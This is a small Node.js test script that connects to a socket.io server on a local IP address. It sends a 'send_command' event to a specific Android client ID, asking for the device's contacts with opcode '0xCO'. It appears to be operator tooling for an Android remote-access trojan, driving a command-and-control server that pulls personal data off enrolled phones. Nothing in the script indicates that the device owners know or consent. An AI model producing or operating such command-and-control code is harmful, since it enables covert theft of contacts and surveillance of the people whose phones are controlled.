const io = require('socket.io-client');

// Connect to server
const socket = io('http://192.168.1.101:9400');

socket.on('connect', () => {
    console.log('✅ Connected to server');
    
    // Send a simple contacts command
    setTimeout(() => {
        console.log('📤 Sending contacts command...');
        
        socket.emit('send_command', {
            clientID: 'android_1758306345283_994', // Use the client ID from logs
            command: {
                type: '0xCO', // Contacts command
                uid: 'test_' + Date.now()
            }
        });
        
        console.log('✅ Command sent successfully');
    }, 2000);
});

socket.on('disconnect', () => {
    console.log('❌ Disconnected from server');
});

socket.on('error', (error) => {
    console.error('❌ Socket error:', error);
});

// Keep alive
setTimeout(() => {
    console.log('⏰ Test completed');
    process.exit(0);
}, 10000);
